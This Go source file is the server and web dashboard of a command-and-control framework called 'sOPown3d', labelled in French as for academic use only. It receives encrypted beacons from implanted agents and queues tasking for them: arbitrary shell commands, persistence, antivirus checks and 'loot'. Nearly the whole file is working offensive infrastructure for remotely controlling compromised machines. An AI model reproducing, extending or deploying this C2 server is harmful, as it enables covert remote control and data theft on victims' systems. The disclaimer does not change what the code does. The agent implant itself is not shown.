package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"sOPown3d/agent/crypto"
	"sOPown3d/shared"
)

var (
	connectionCount = 0
	pendingCommands = make(map[string]shared.Command)
)

func main() {
	fmt.Println("=== Serveur sOPown3d - Gestion Commandes ===")
	fmt.Println("URL: http://127.0.0.1:8080")
	fmt.Println("Usage académique uniquement")
	fmt.Println("============================================")

	// Routes
	http.HandleFunc("/beacon", handleBeacon)
	http.HandleFunc("/command", handleSendCommand)
	http.HandleFunc("/", handleDashboard)

	// Démarrer
	err := http.ListenAndServe("127.0.0.1:8080", nil)
	if err != nil {
		fmt.Println("Erreur:", err)
	}
}

// Page d'accueil
func handleDashboard(w http.ResponseWriter, r *http.Request) {
	html := `
    <!DOCTYPE html>
    <html>
    <head>
        <title>sOPown3d C2 Dashboard</title>
        <style>
            body { 
                font-family: 'Segoe UI', Arial; 
                margin: 40px;
                background: #1a1a1a;
                color: white;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: #2d2d2d;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 0 20px rgba(0,0,0,0.5);
            }
            h1 { color: #4CAF50; }
            .agent-id {
                background: #3d3d3d;
                padding: 10px;
                border-radius: 5px;
                font-family: monospace;
                margin: 10px 0;
            }
            .command-box {
                background: #3d3d3d;
                padding: 20px;
                border-radius: 5px;
                margin: 20px 0;
            }
            input, select, button {
                padding: 10px;
                margin: 5px;
                border: none;
                border-radius: 5px;
            }
            input {
                width: 300px;
                background: #4d4d4d;
                color: white;
            }
            select {
                background: #4d4d4d;
                color: white;
                width: 150px;
            }
            button {
                background: #4CAF50;
                color: white;
                cursor: pointer;
                font-weight: bold;
            }
            button:hover {
                background: #45a049;
            }
            #response {
                background: #3d3d3d;
                padding: 15px;
                border-radius: 5px;
                margin-top: 20px;
                font-family: monospace;
                white-space: pre-wrap;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>⚡ sOPown3d - Dashboard Éducatif</h1>
            <p><strong>⚠️ Usage académique uniquement</strong></p>
            
            <h3>📡 Envoyer une commande</h3>
            
            <div class="agent-id">
                <label>Agent ID:</label>
                <input type="text" id="agentId" placeholder="Ex: HP-de-Abdel-1768755944" value="HP-de-Abdel-1768755944">
            </div>
            
            <div class="command-box">
                <label>Commande:</label>
                <select id="commandSelect" onchange="updatePayload()">
                    <option value="shell">shell</option>
                    <option value="info">info</option>
                    <option value="ping">ping</option>
					<option value="persist">persist</option>
					<option value="checkav">checkav</option>
					<option value="loot">loot</option>
                </select>
                
                <br><br>
                
                <label>Payload:</label>
                <input type="text" id="payload" placeholder="Commande à exécuter" value="whoami">
                
                <br><br>
                
                <button onclick="sendCommand()">🚀 Envoyer la commande</button>
            </div>
            
            <div id="response">En attente...</div>
            
            <h3>📋 Commandes de test:</h3>
            <button onclick="testCommand('whoami')">whoami</button>
            <button onclick="testCommand('ipconfig')">ipconfig</button>
            <button onclick="testCommand('dir')">dir</button>
            <button onclick="testCommand('ping')">ping</button>
        </div>
        
        <script>
            function updatePayload() {
                const cmd = document.getElementById('commandSelect').value;
                const payloadInput = document.getElementById('payload');
                
                if (cmd === 'shell') {
                    payloadInput.value = 'whoami';
                    payloadInput.placeholder = 'Commande à exécuter';
                } else if (cmd === 'info') {
                    payloadInput.value = '';
                    payloadInput.placeholder = 'Pas de payload pour info';
                } else if (cmd === 'ping') {
                    payloadInput.value = '';
                    payloadInput.placeholder = 'Pas de payload pour ping';
                }
            }
            
            function testCommand(cmd) {
                document.getElementById('commandSelect').value = 'shell';
                document.getElementById('payload').value = cmd;
                sendCommand();
            }
            
            async function sendCommand() {
                const agentId = document.getElementById('agentId').value;
                const action = document.getElementById('commandSelect').value;
                const payload = document.getElementById('payload').value;
                
                if (!agentId) {
                    alert('Entrez un Agent ID');
                    return;
                }
                
                const responseDiv = document.getElementById('response');
                responseDiv.innerHTML = 'Envoi en cours...';
                
                try {
                    const response = await fetch('/command', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            id: agentId,
                            action: action,
                            payload: payload
                        })
                    });
                    
                    const result = await response.json();
                    responseDiv.innerHTML = '✅ Commande envoyée avec succès!\n\n' + 
                                           'Agent: ' + agentId + '\n' +
                                           'Action: ' + action + '\n' +
                                           'Payload: ' + payload + '\n\n' +
                                           'L\'agent récupérera la commande au prochain beacon.';
                    
                } catch (error) {
                    responseDiv.innerHTML = '❌ Erreur: ' + error;
                }
            }
            
            // Focus sur l'input Agent ID
            document.getElementById('agentId').focus();
        </script>
    </body>
    </html>
    `
	w.Write([]byte(html))
}

// Recevoir beacon CHIFFRÉ
func handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "POST seulement", 405)
		return
	}

	connectionCount++

	// 1. Lire message chiffré
	var encryptedMsg shared.EncryptedMessage
	if err := json.NewDecoder(r.Body).Decode(&encryptedMsg); err != nil {
		fmt.Printf("[!] Erreur format message: %v\n", err)
		http.Error(w, "Format invalide", 400)
		return
	}

	// 2. Déchiffrer
	decrypted, err := crypto.Decrypt(encryptedMsg.Data)
	if err != nil {
		fmt.Printf("[!] Erreur déchiffrement: %v\n", err)
		http.Error(w, "Déchiffrement échoué", 400)
		return
	}

	// 3. Parser les infos agent
	var agentInfo shared.AgentInfo
	if err := json.Unmarshal([]byte(decrypted), &agentInfo); err != nil {
		fmt.Printf("[!] Erreur JSON: %v\n", err)
		http.Error(w, "JSON invalide", 400)
		return
	}

	now := time.Now().Format("15:04:05")
	fmt.Printf("[%s] Beacon #%d - Agent: %s\n", now, connectionCount, agentInfo.Hostname)

	// 4. Vérifier commande en attente
	agentID := agentInfo.Hostname
	if cmd, exists := pendingCommands[agentID]; exists {
		// Chiffrer la commande avant envoi
		cmdJSON, _ := json.Marshal(cmd)
		encryptedCmd, err := crypto.Encrypt(string(cmdJSON))
		if err != nil {
			fmt.Printf("[!] Erreur chiffrement commande: %v\n", err)
		} else {
			response := shared.EncryptedMessage{Data: encryptedCmd}
			json.NewEncoder(w).Encode(response)
			delete(pendingCommands, agentID)
			fmt.Printf("    → Commande envoyée (chiffrée): %s\n", cmd.Action)
		}
	} else {
		// Réponse vide chiffrée
		emptyResp, _ := crypto.Encrypt("{}")
		response := shared.EncryptedMessage{Data: emptyResp}
		json.NewEncoder(w).Encode(response)
	}
}

// Programmer une commande
func handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "POST seulement", 405)
		return
	}

	var cmd shared.Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	// Stocker la commande
	pendingCommands[cmd.ID] = cmd

	fmt.Printf("[!] Commande pour %s: %s\n", cmd.ID, cmd.Action)

	w.Write([]byte(`{"status": "ok"}`))
}
